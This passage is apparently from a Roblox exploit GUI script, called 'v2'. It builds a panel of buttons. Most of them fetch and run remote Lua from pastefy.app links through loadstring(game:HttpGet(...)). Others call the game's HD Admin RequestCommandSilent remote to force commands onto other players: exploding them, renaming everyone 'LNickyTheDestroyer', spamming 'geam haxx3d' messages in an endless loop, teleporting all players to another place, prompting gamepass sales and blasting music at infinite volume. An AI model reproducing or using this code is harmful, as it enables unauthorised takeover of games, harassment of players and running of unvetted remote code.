		G2L["a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["a1"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["a1"]["ClipsDescendants"] = true;
		G2L["a1"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a1"]["Text"] = [[TK Theme]];
		G2L["a1"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["a2"] = Instance.new("LocalScript", G2L["a1"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["a3"] = Instance.new("TextButton", G2L["55"]);
		G2L["a3"]["TextWrapped"] = true;
		G2L["a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a3"]["TextSize"] = 20;
		G2L["a3"]["TextScaled"] = true;
		G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["a3"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["a3"]["ClipsDescendants"] = true;
		G2L["a3"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a3"]["Text"] = [[Pants Pocket]];
		G2L["a3"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["a4"] = Instance.new("LocalScript", G2L["a3"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["a5"] = Instance.new("TextButton", G2L["55"]);
		G2L["a5"]["TextWrapped"] = true;
		G2L["a5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a5"]["TextSize"] = 20;
		G2L["a5"]["TextScaled"] = true;
		G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["a5"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["a5"]["ClipsDescendants"] = true;
		G2L["a5"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a5"]["Text"] = [[Casin Repost]];
		G2L["a5"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["a6"] = Instance.new("LocalScript", G2L["a5"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["a7"] = Instance.new("TextButton", G2L["55"]);
		G2L["a7"]["TextWrapped"] = true;
		G2L["a7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a7"]["TextSize"] = 20;
		G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["a7"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["a7"]["ClipsDescendants"] = true;
		G2L["a7"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a7"]["Text"] = [[90 Dollars]];
		G2L["a7"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["a8"] = Instance.new("LocalScript", G2L["a7"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["a9"] = Instance.new("TextButton", G2L["55"]);
		G2L["a9"]["TextWrapped"] = true;
		G2L["a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a9"]["TextSize"] = 20;
		G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["a9"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["a9"]["ClipsDescendants"] = true;
		G2L["a9"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["a9"]["Text"] = [[20 Notorius]];
		G2L["a9"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["aa"] = Instance.new("LocalScript", G2L["a9"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["ab"] = Instance.new("TextButton", G2L["55"]);
		G2L["ab"]["TextWrapped"] = true;
		G2L["ab"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["ab"]["TextSize"] = 20;
		G2L["ab"]["TextScaled"] = true;
		G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["ab"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["ab"]["ClipsDescendants"] = true;
		G2L["ab"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["ab"]["Text"] = [[DJ GRT Hydra]];
		G2L["ab"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["ac"] = Instance.new("LocalScript", G2L["ab"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["ad"] = Instance.new("TextButton", G2L["55"]);
		G2L["ad"]["TextWrapped"] = true;
		G2L["ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["ad"]["TextSize"] = 20;
		G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["ad"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["ad"]["ClipsDescendants"] = true;
		G2L["ad"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["ad"]["Text"] = [[Loud Trap]];
		G2L["ad"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["ae"] = Instance.new("LocalScript", G2L["ad"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["af"] = Instance.new("TextButton", G2L["55"]);
		G2L["af"]["TextWrapped"] = true;
		G2L["af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["af"]["TextSize"] = 20;
		G2L["af"]["TextScaled"] = true;
		G2L["af"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["af"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["af"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["af"]["ClipsDescendants"] = true;
		G2L["af"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["af"]["Text"] = [[MYM Remix]];
		G2L["af"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["b0"] = Instance.new("LocalScript", G2L["af"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["b1"] = Instance.new("TextButton", G2L["55"]);
		G2L["b1"]["TextWrapped"] = true;
		G2L["b1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b1"]["TextSize"] = 20;
		G2L["b1"]["TextScaled"] = true;
		G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["b1"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["b1"]["ClipsDescendants"] = true;
		G2L["b1"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b1"]["Text"] = [[AITO Masked]];
		G2L["b1"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["b2"] = Instance.new("LocalScript", G2L["b1"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton
		G2L["b3"] = Instance.new("TextButton", G2L["55"]);
		G2L["b3"]["TextWrapped"] = true;
		G2L["b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b3"]["TextSize"] = 20;
		G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["b3"]["Size"] = UDim2.new(0, 90, 0, 35);
		G2L["b3"]["ClipsDescendants"] = true;
		G2L["b3"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b3"]["Text"] = [[SugarCrash]];
		G2L["b3"]["Position"] = UDim2.new(0.5125, 0, 0.25, 0);
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		G2L["b4"] = Instance.new("LocalScript", G2L["b3"]);
	
	
	
		-- StarterGui.v2.Frame.TextButton
		G2L["b5"] = Instance.new("TextButton", G2L["2"]);
		G2L["b5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b5"]["TextSize"] = 20;
		G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["b5"]["Size"] = UDim2.new(0, 80, 0, 35);
		G2L["b5"]["ClipsDescendants"] = true;
		G2L["b5"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b5"]["Text"] = [[F3X]];
		G2L["b5"]["Position"] = UDim2.new(0.0125, 0, 0.11744, 0);
	
	
		-- StarterGui.v2.Frame.TextButton.LocalScript
		G2L["b6"] = Instance.new("LocalScript", G2L["b5"]);
	
	
	
		-- StarterGui.v2.Frame.TextButton
		G2L["b7"] = Instance.new("TextButton", G2L["2"]);
		G2L["b7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b7"]["TextSize"] = 20;
		G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["b7"]["Size"] = UDim2.new(0, 80, 0, 35);
		G2L["b7"]["ClipsDescendants"] = true;
		G2L["b7"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b7"]["Text"] = [[R6]];
		G2L["b7"]["Position"] = UDim2.new(0.785, 0, 0.11744, 0);
	
	
		-- StarterGui.v2.Frame.TextButton.LocalScript
		G2L["b8"] = Instance.new("LocalScript", G2L["b7"]);
	
	
	
		-- StarterGui.v2.Frame.ImageLabel
		G2L["b9"] = Instance.new("ImageLabel", G2L["2"]);
		G2L["b9"]["ZIndex"] = 0;
		G2L["b9"]["BorderSizePixel"] = 0;
		G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b9"]["ScaleType"] = Enum.ScaleType.Crop;
		G2L["b9"]["ImageTransparency"] = 0.7;
		G2L["b9"]["Image"] = [[rbxassetid://106244637236514]];
		G2L["b9"]["Size"] = UDim2.new(0, 399, 0, 437);
		G2L["b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b9"]["BackgroundTransparency"] = 1;
		G2L["b9"]["Position"] = UDim2.new(0, 0, -0, 0);
	
	
		-- StarterGui.v2.Frame.TextButton
		G2L["ba"] = Instance.new("TextButton", G2L["2"]);
		G2L["ba"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["ba"]["TextSize"] = 20;
		G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["ba"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["ba"]["Size"] = UDim2.new(0, 80, 0, 35);
		G2L["ba"]["ClipsDescendants"] = true;
		G2L["ba"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["ba"]["Text"] = [[Theme]];
		G2L["ba"]["Position"] = UDim2.new(0.0125, 0, 0.58023, 0);
	
	
		-- StarterGui.v2.Frame.TextButton.LocalScript
		G2L["bb"] = Instance.new("LocalScript", G2L["ba"]);
	
	
	
		-- StarterGui.v2.Frame.TextButton
		G2L["bc"] = Instance.new("TextButton", G2L["2"]);
		G2L["bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["bc"]["TextSize"] = 20;
		G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
		G2L["bc"]["Size"] = UDim2.new(0, 80, 0, 35);
		G2L["bc"]["ClipsDescendants"] = true;
		G2L["bc"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["bc"]["Text"] = [[RE]];
		G2L["bc"]["Position"] = UDim2.new(0.785, 0, 0.58023, 0);
	
	
		-- StarterGui.v2.Frame.TextButton.LocalScript
		G2L["bd"] = Instance.new("LocalScript", G2L["bc"]);
	
	
	
		-- StarterGui.v2.Frame.LocalScript
		G2L["be"] = Instance.new("LocalScript", G2L["2"]);
	
	
	
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_8()
			local script = G2L["8"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/hQaM4tQS/raw"))()
			end)
		end;
		task.spawn(C_8);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_a()
			local script = G2L["a"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/lSggRd2i/raw"))()
			end)
		end;
		task.spawn(C_a);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_c()
			local script = G2L["c"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/FEMCQNIs/raw"))()
			end)
		end;
		task.spawn(C_c);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_e()
			local script = G2L["e"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/iBGz7xui/raw"))()
			end)
		end;
		task.spawn(C_e);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_10()
			local script = G2L["10"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/BzW3F5ln/raw"))()
			end)
		end;
		task.spawn(C_10);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_12()
			local script = G2L["12"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/Mt51Kn6Z/raw"))()
			end)
		end;
		task.spawn(C_12);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_14()
			local script = G2L["14"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/VZptEWMg/raw"))()
			end)
		end;
		task.spawn(C_14);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_16()
			local script = G2L["16"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/PhBq1NUZ/raw"))()
			end)
		end;
		task.spawn(C_16);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_17()
			local script = G2L["17"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/PhBq1NUZ/raw"))()
			end)
		end;
		task.spawn(C_17);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_18()
			local script = G2L["18"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/PhBq1NUZ/raw"))()
			end)
		end;
		task.spawn(C_18);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_19()
			local script = G2L["19"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/PhBq1NUZ/raw"))()
			end)
		end;
		task.spawn(C_19);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_1b()
			local script = G2L["1b"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/5gqKsfnc/raw"))()
			end)
		end;
		task.spawn(C_1b);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_1d()
			local script = G2L["1d"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/Rug7YbM5/raw"))()
			end)
		end;
		task.spawn(C_1d);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_1f()
			local script = G2L["1f"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/8NYoD6yK/raw"))()
			end)
		end;
		task.spawn(C_1f);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_21()
			local script = G2L["21"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/uFQzRcyO/raw"))()
			end)
		end;
		task.spawn(C_21);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_23()
			local script = G2L["23"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/DlJjJHfN/raw"))()
			end)
		end;
		task.spawn(C_23);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_25()
			local script = G2L["25"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/e2DVKYQA/raw"))()
			end)
		end;
		task.spawn(C_25);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_27()
			local script = G2L["27"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/o5wcC2Z5/raw"))()
			end)
		end;
		task.spawn(C_27);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_29()
			local script = G2L["29"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/lh43oj20/raw"))()
			end)
		end;
		task.spawn(C_29);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_2b()
			local script = G2L["2b"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";place all 112314711905647")
			end)
		end;
		task.spawn(C_2b);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_2d()
			local script = G2L["2d"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";god all")
			end)
		end;
		task.spawn(C_2d);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_2f()
			local script = G2L["2f"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";explode others")
			end)
		end;
		task.spawn(C_2f);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_31()
			local script = G2L["31"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/tdFwAOdo/raw"))()
			end)
		end;
		task.spawn(C_31);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_33()
			local script = G2L["33"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer("char others LNickyTheDestroyer")
				task.wait(1)
				RequestCommandSilent:InvokeServer(";name others LNickyTheDestroyer")
			end)
		end;
		task.spawn(C_33);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_35()
			local script = G2L["35"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";undisco")
			end)
		end;
		task.spawn(C_35);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_37()
			local script = G2L["37"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/aSpew3Mg/raw"))()
			end)
		end;
		task.spawn(C_37);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_39()
			local script = G2L["39"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";spin all")
			end)
		end;
		task.spawn(C_39);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_3b()
			local script = G2L["3b"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";r6 others")
			end)
		end;
		task.spawn(C_3b);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_3d()
			local script = G2L["3d"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/eNAaj5e6/raw"))()
			end)
		end;
		task.spawn(C_3d);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_3f()
			local script = G2L["3f"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/RfBCiBEY/raw"))()
			end)
		end;
		task.spawn(C_3f);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_41()
			local script = G2L["41"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				while true do
					task.wait(2.7)
					RequestCommandSilent:InvokeServer(";sm geam haxx3d by LNickyTheDestroyer!!11!")
					task.wait(2.7)
					RequestCommandSilent:InvokeServer(";sm geam haxx3d by LNickyTheDestroyer!!11!")
				end
			end)
		end;
		task.spawn(C_41);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_43()
			local script = G2L["43"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/M6QVci4z/raw"))()
			end)
		end;
		task.spawn(C_43);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_45()
			local script = G2L["45"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";sellGamepass all 1538485875")
			end)
		end;
		task.spawn(C_45);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_47()
			local script = G2L["47"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";title all LNickyTheDestroyer was here!11!!1")
			end)
		end;
		task.spawn(C_47);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_49()
			local script = G2L["49"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";warp others")
			end)
		end;
		task.spawn(C_49);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_4b()
			local script = G2L["4b"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/T4BsWpCZ/raw"))()
			end)
		end;
		task.spawn(C_4b);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_4d()
			local script = G2L["4d"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";r15 others")
			end)
		end;
		task.spawn(C_4d);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_4f()
			local script = G2L["4f"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/ZrCqBKtx/raw"))()
			end)
		end;
		task.spawn(C_4f);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_51()
			local script = G2L["51"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/F5p7eWG7/raw"))()
			end)
		end;
		task.spawn(C_51);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_53()
			local script = G2L["53"];
			script.Parent.MouseButton1Click:Connect(function()
				loadstring(game:HttpGet("https://pastefy.app/rP3S5ExT/raw"))()
			end)
		end;
		task.spawn(C_53);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_58()
			local script = G2L["58"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 1846368080 ;volume inf")
			end)
		end;
		task.spawn(C_58);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_5a()
			local script = G2L["5a"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 72420924397376 ;volume inf ;pitch 0.2")
			end)
		end;
		task.spawn(C_5a);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_5c()
			local script = G2L["5c"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 128327365740560 ;volume inf ;pitch 0.1")
			end)
		end;
		task.spawn(C_5c);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_5e()
			local script = G2L["5e"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 106687731139619 ;volume inf ;pitch 0.118")
			end)
		end;
		task.spawn(C_5e);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_60()
			local script = G2L["60"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 94797081270081 ;volume inf ;pitch 0.2")
			end)
		end;
		task.spawn(C_60);
		-- StarterGui.v2.Frame.ScrollingFrame.TextButton.LocalScript
		local function C_62()
			local script = G2L["62"];
			script.Parent.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
				RequestCommandSilent:InvokeServer(";music 139847200557124 ;volume inf ;pitch 0.106")
			end)
		end;
		task.spawn(C_62);
